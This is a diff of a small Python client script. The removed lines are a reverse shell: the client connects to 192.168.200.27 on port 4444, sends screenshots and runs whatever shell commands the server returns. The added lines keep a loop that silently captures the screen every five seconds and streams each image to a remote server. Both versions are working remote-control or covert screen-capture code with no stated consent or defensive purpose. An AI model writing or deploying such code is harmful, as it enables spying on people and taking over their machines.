@@ -1,41 +1,31 @@
 import socket
-import subprocess
-from PIL import ImageGrab
 import io
 import time
+from PIL import ImageGrab
 
-def capture_screen():
-    screenshot = ImageGrab.grab()
-    img_byte_arr = io.BytesIO()
-    screenshot.save(img_byte_arr, format='PNG')
-    return img_byte_arr.getvalue()
-
-def connect_to_server():
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client_socket.connect(("192.168.200.27", 4444))
-    
+def send_screenshot(client_socket):
     try:
         while True:
-            # Capture and send screenshot
-            img_data = capture_screen()
+            # Capture the screen
+            img = ImageGrab.grab()
+            with io.BytesIO() as buffer:
+                img.save(buffer, format='PNG')
+                img_data = buffer.getvalue()
+
+            # Send the screenshot data to the server
             client_socket.sendall(b"SCREENSHOT" + img_data)
 
-            # Receive and execute command
-            command = client_socket.recv(1024).decode()
-            if command.lower() == "exit":
-                break
-
-            output = subprocess.getoutput(command)
-            if not output:
-                output = "Command executed."
-            client_socket.sendall(output.encode())
-
-            time.sleep(1)  # Delay to avoid flooding the server
-
+            # Wait before taking the next screenshot
+            time.sleep(5)  # Adjust the interval as needed
     except Exception as e:
         print(f"Error: {e}")
-    
-    client_socket.close()
+
+def main():
+    server_ip = "127.0.0.1"  # Change this to your server's IP address
+    server_port = 4444
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((server_ip, server_port))
+    send_screenshot(client_socket)
 
 if __name__ == "__main__":
-    connect_to_server()
+    main()
